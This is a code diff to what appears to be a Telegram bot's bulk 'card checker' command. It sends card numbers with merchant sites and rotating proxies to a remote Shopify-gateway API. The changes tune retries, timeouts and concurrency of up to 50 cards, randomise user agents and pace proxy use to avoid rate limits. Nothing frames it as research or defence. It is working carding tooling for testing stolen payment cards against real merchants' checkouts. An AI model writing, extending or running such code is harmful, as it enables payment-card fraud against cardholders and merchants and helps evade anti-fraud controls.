@@ -6285,7 +6285,8 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
         const mtxtProxies = mtxtProxiesRaw || [];
 
          const SHOPIFY_API_URL_MTXT = "https://web-production-9db0.up.railway.app/shopify";
-         const MTXT_MAX_RETRIES = 2; // Reduced for mass checking (50 concurrent cards)
+         const MTXT_MAX_RETRIES = 1; // Keep /mtxt fast: one hard API retry, then rotate site/card thread
+         const MTXT_API_TIMEOUT_MS = 30000;
          const mtxtStartTime = Date.now();
 
          const mtxtBadResponses = ["Site not supported", "PAYMENTS_PAYMENT_FLEXIBILITY_TERMS_ID_MISMATCH", "DELIVERY_DELIVERY_LINE_DETAIL_CHANGED", "Payment method not available", "ARTIFACT_DISSATISFACTION", "VALIDATION_CUSTOM", '"Gateway":"Authorize.net"'];
@@ -6349,13 +6350,20 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
          };
 
          // Single API call — exact match of web callApiOnce
-         const mtxtCallOnce = async (cardCC: string, siteUrl: string, proxy: string) => {
-           const apiUrl = proxy
-             ? `${SHOPIFY_API_URL_MTXT}?cc=${encodeURIComponent(cardCC)}&site=${encodeURIComponent(siteUrl)}&proxy=${encodeURIComponent(proxy)}`
-             : `${SHOPIFY_API_URL_MTXT}?cc=${encodeURIComponent(cardCC)}&site=${encodeURIComponent(siteUrl)}`;
+          const mtxtBuildApiUrl = (cardCC: string, siteUrl: string, proxy: string) => {
+            const params = new URLSearchParams();
+            params.set("cc", cardCC.trim());
+            params.set("site", siteUrl.trim());
+            if (proxy?.trim()) params.set("proxy", proxy.trim());
+            return `${SHOPIFY_API_URL_MTXT}?${params.toString()}`;
+          };
+
+          const mtxtCallOnce = async (cardCC: string, siteUrl: string, proxy: string) => {
+            const apiUrl = mtxtBuildApiUrl(cardCC, siteUrl, proxy);
            const controller = new AbortController();
-           const timeout = setTimeout(() => controller.abort(), 55000); // 55s like web
+            const timeout = setTimeout(() => controller.abort(), MTXT_API_TIMEOUT_MS);
            try {
+              console.log(`[MTXT API] card=${cardCC.split('|')[0]?.slice(0, 6)}****${cardCC.split('|')[0]?.slice(-4)} site=${siteUrl} proxy=${proxy ? 'yes' : 'direct'}`);
              const resp = await fetch(apiUrl, { method: "GET", headers: { 'Accept': 'application/json, text/plain, */*', 'User-Agent': mtxtUserAgents[Math.floor(Math.random() * mtxtUserAgents.length)], 'Cache-Control': 'no-cache' }, signal: controller.signal });
              clearTimeout(timeout);
              const rawText = await resp.text();
@@ -6609,9 +6617,13 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
            return { msg, buttons };
          };
 
-         // 50-thread concurrency with staggered launches like web Shopify gateway
-         const MTXT_CONCURRENCY = 50;
-         const MTXT_STAGGER_MS_VAL = 180;
+          // Dynamic threads for Telegram /mtxt: hard direct API requests should run fast,
+          // while proxy-backed checks stay lower to avoid proxy/IP rate-limits.
+          const mtxtActiveProxyCount = mtxtProxies.filter((p: any) => !mtxtFailedProxyIds.includes(p.id)).length;
+          const MTXT_CONCURRENCY = mtxtActiveProxyCount > 0
+            ? Math.max(4, Math.min(12, mtxtActiveProxyCount, mtxtCards.length))
+            : Math.max(8, Math.min(50, mtxtCards.length));
+          const MTXT_STAGGER_MS_VAL = mtxtActiveProxyCount > 0 ? 250 : 90;
 
          // Throttled UI update - max 1 edit per 500ms, always send on force
          let mtxtLastEditTime = 0;
@@ -6702,7 +6714,7 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
          };
 
          // Show initial processing message with animation
-         const initData = buildMtxtMessageAndButtons(0, mtxtCards.length, '0.00', false);
+          const initData = buildMtxtMessageAndButtons(0, mtxtCards.length, '0.00', false);
          await editTelegramMessage(callbackChatId, messageId, initData.msg, { inline_keyboard: initData.buttons });
 
          // Process card helper
@@ -6800,7 +6812,9 @@ ${shCountryFlag} ${escapeHtml(shBinCountry)}
            }
          };
 
-        // Staggered 50-card session model (matching web Shopify gateway)
+         await editTelegramMessage(callbackChatId, messageId, `${initData.msg}\n⚙️ <i>Threads: ${MTXT_CONCURRENCY} · API: hard site request</i>`, { inline_keyboard: initData.buttons });
+
+        // Staggered threaded session model (matching web Shopify gateway, adjusted for Telegram runtime)
          const mtxtQueue = mtxtCards.map(c => c.trim()).filter(c => c);
          let mtxtQueueIdx = 0;
          const MIN_COMPLETE_BEFORE_NEXT = 49;
